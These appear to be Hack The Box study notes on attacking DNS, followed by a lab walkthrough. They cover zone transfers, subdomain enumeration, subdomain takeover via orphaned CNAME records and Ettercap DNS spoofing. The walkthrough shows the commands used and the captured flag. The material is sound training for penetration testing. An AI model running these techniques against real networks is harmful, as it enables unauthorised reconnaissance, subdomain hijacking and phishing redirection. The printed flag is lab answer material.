## 1. Protocol Overview & Core Enumeration

The **Domain Name System (DNS)** resolves human-readable domain names (e.g., `hackthebox.com`) into computer-routable numerical IP addresses (e.g., `104.17.42.72`).

### Key Architectural Characteristics

* **Default Port:** Operates primarily over **UDP port 53**.
* **TCP Fallback:** DNS automatically falls back to **TCP port 53** when data transmission payloads exceed the structural packet size limit of a single UDP packet (typically 512 bytes), such as during massive record responses or zone transfers.
* **High-Value Target:** Because almost all network applications depend entirely on DNS configurations, compromising an enterprise DNS server exposes critical operational data and opens massive lateral movement vectors.

### Service Enumeration & Fingerprinting

Initial mapping requires service fingerprinting to identify the underlying software version and active configuration settings.

Scan target for active DNS services using Nmap:

`nmap -p53 -Pn -sV -sC 10.10.110.213`

* **-sV**: Attempts to fingerprint the service application name and version (e.g., `ISC BIND 9.11.3`).
* **-sC**: Automatically executes default Nmap NSE enumeration scripts against the open port.

## 2. DNS Zone Transfer Vulnerabilities (AXFR)

A **DNS Zone** represents a specific administrative subsection of an organization's overall network namespace. To maintain high availability across infrastructure, primary DNS name servers utilize **DNS Zone Transfers** to copy their local database records to secondary backup name servers.

### The Misconfiguration Flaw

If an administrator fails to implement explicit access control lists (ACLs) limiting which source IP addresses can request copies of the zone database, **any unauthenticated operator can query the server and pull a complete copy of the network infrastructure blueprint.**

> **Operational Note:** While standard DNS queries resolve over UDP, structural DNS Zone Transfers run exclusively over **TCP port 53** to ensure reliable data stream transmission.

### Exploitation via the Dig Utility

Using the `dig` command with the query type parameter set to **AXFR** (Full Zone Transfer Request), you can dump an organization's entire internal and external DNS namespace structure:

`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`

* **@ns1.inlanefreight.htb**: Specifies the exact target DNS server to query.
* **inlanefreight.htb**: Identifies the targeted network zone domain.

The resulting output exposes hidden network hosts, administrative portals, or subdomains (e.g., `admin.inlanefreight.htb`, `hr.inlanefreight.htb`) without needing active brute-force guess attempts.

### Automated Exploitation via Fierce

`Fierce` is a specialized reconnaissance tool that automatically enumerates all authoritative nameservers for a target domain and immediately tests each server for open zone transfer vulnerabilities.

`fierce --domain zonetransfer.me`

## 3. Subdomain & Domain Takeovers

### A. Core Concept: Subdomain Takeover

Many modern organizations leverage third-party software architectures (such as AWS S3, GitHub Pages, Akamai, or Fastly CDNs) to host specific web assets. To integrate these external resources, administrators configure a **Canonical Name (CNAME)** record to point a local subdomain to an external service provider address:

`support.inlanefreight.com   IN   CNAME   inlanefreight.s3.amazonaws.com`

If the organization eventually stops using the external service or deletes the asset repository (e.g., deletes the underlying AWS S3 bucket), but the administrator **neglects to remove the matching CNAME record from the DNS server**, the record becomes an orphan dangling pointer.

> **The Flaw:** Since the pointer record remains globally active, any rogue operator can visit the external provider (AWS, GitHub, etc.) and register a new asset matching the exact name referenced in the CNAME. Once claimed, the attacker gains full logical control over the authoritative enterprise subdomain (`support.inlanefreight.com`) to deploy malicious code or execute highly trusted phishing attacks.

---

### B. Subdomain Discovery Workflow

#### Passive Enumeration via Subfinder

`Subfinder` safely scrapes public open-source intelligence (OSINT) API logs and repositories (such as DNSdumpster) to locate valid subdomains:

`subfinder -d inlanefreight.com -v`

#### Active Internal Brute-Forcing via Subbrute

When working in internal network environments or restricted pivot hosts lacking internet access, `Subbrute` executes pure DNS record brute-forcing using custom internal resolver files:

`./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt`

---

### C. Identifying & Confirming Takeover Vulnerabilities

Once your enumeration tools isolate the available subdomains, investigate their exact routing mappings using the `host` or `nslookup` utilities:

`host support.inlanefreight.com`

*Example Enumeration Response:*
`support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com`

If visiting the web application URL throws an explicit resource missing error page (e.g., an AWS message stating **NoSuchBucket**), it mathematically confirms that the underlying asset space is vacant. You can safely claim this subdomain path by simply generating an AWS S3 bucket matching that exact unique name string.

## 4. Local DNS Spoofing & Cache Poisoning

**DNS Spoofing** (or Cache Poisoning) involves altering legitimate DNS records stored inside a server or routing path with fraudulent mapping data. This shifts targeted user web traffic away from legitimate enterprise platforms and directly onto malicious attacker infrastructure.

### Local Exploitation Workflow via Ettercap

From a local area network (LAN) perspective, an attacker can hijack resolution paths using Man-in-the-Middle (MITM) tools like `Ettercap` or `Bettercap`.

#### Step 1 — Modify the Target DNS Entry File

Open and edit the configuration dictionary mapping file located at `/etc/ettercap/etter.dns` to mirror your desired redirection target properties:

```text
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110

```

* **inlanefreight.com**: The target asset domain you wish to actively hijack.
* **192.168.225.110**: The IP address of your malicious attack server hosting the spoofed landing page.

#### Step 2 — Initialize the Poisoning Run

1. Launch the `Ettercap` application workspace.
2. Select **Hosts > Scan for Hosts** to discover alive nodes on the current network block.
3. Assign the targeted victim host machine IP address (e.g., `192.168.152.129`) to **Target 1**.
4. Assign the local network default gateway router IP address (e.g., `192.168.152.2`) to **Target 2**.
5. Navigate to **Plugins > Manage Plugins** and double-click to activate the **dns_spoof** module.

#### Step 3 — Verifying Exploitation

Once the plugin starts running, it forcefully intercepts incoming lookup traffic from Target 1 and injects fake DNS answer packets.

If the victim target launches a ping or uses a browser to visit the target domain, the host automatically drops original verification boundaries and resolves entirely to your rogue IP infrastructure:

`ping inlanefreight.com`

*Expected Spoofed Output:*
`Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:`

# Attacking DNS

This section focused on DNS enumeration and zone transfer abuse. The key lesson was simple: when direct zone transfer fails, enumerate deeper and pivot intelligently.

---

## Question 1

Find all available DNS records for the `inlanefreight.htb` domain on the target name server and submit the flag found as a DNS record as the answer.

First, I scanned the target for DNS:

```bash
nmap -p53 -sV -sC 10.129.203.6
```

### Result

- Port 53 open
- ISC BIND 9.16.1
- Authoritative DNS server

So the target was running its own DNS zone.

---

## Attempting Zone Transfer

So I attempted a full zone transfer:

```bash
dig AXFR inlanefreight.htb @10.129.203.6
```

### Result

```text
Transfer failed.
```

That means AXFR is restricted for the main zone. This is common in properly configured DNS servers.

---

## Enumerating the NS Record

So instead of stopping, I pivoted. I checked the NS record:

```bash
dig NS inlanefreight.htb @10.129.203.6
```

It returned:

```text
ns.inlanefreight.htb → 127.0.0.1
```

Interesting detail. The nameserver resolves to localhost. That often means zone transfers are restricted to internal sources.

---

## Subdomain Enumeration

Since the main zone was locked down, I moved to subdomain enumeration. Because recursion was disabled, I brute-forced subdomains using Subbrute.

First, I pointed it to the target DNS server:

```bash
echo "10.129.203.6" > resolvers.txt
```

Then ran:

```bash
python3 subbrute.py -p inlanefreight.htb -s names.txt -r resolvers.txt
```

After some time, I discovered:

```text
hr.inlanefreight.htb
```

That was the breakthrough, and I attempted AXFR against this new subdomain:

```bash
dig AXFR hr.inlanefreight.htb @10.129.203.6
```

This time, the zone transfer succeeded.

---

## Zone Transfer Success

The full zone dump revealed multiple DNS records, including a TXT record containing the flag.

That TXT record was the answer.

---

## Answer

```text
HTB{LUIHNFAS2871SJK1259991}
```

---

# Key Takeaways

- If root zone transfer fails, enumerate subdomains.
- DNS servers often misconfigure sub-zones differently than the root.
- Brute forcing authoritative DNS directly can reveal hidden zones.
- TXT records are common flag storage locations.
- DNS enumeration is about patience and pattern recognition, not force.

The root zone was locked. The `hr` zone was not. The flag lived there.

DNS is rarely loud. But when it leaks, it leaks everything.
